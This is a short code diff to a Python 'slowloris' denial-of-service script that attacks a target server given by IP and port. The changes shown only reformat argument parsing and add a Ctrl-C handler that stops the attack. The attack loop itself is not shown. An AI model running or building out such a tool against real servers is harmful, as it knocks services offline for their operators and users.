@@ -3,13 +3,16 @@
 import argparse
 import socket
 import sys
+import signal
 import time
 
 parser = argparse.ArgumentParser(
     prog="slowloris", description="Perform slowloris attack on given target server"
 )
 parser.add_argument("ip", default="127.0.0.1", help="IP address of the target server")
-parser.add_argument("-p", "--port", default=80, help="port of webserver [default: 80]", type=int)
+parser.add_argument(
+    "-p", "--port", default=80, help="port of webserver [default: 80]", type=int
+)
 parser.add_argument(
     "-c",
     "--socket-count",
@@ -37,7 +40,14 @@ request = [
 request = "\r\n".join(request)
 
 
+def ctrlc_handler(signal, frame):
+    print("INFO: Ctrl-C revieved, stopping attack")
+    exit(0)
+
+
 def main():
+    signal.signal(signal.SIGINT, ctrlc_handler)
+
     s = socket.socket()
     try:
         s.connect((args.ip, args.port))
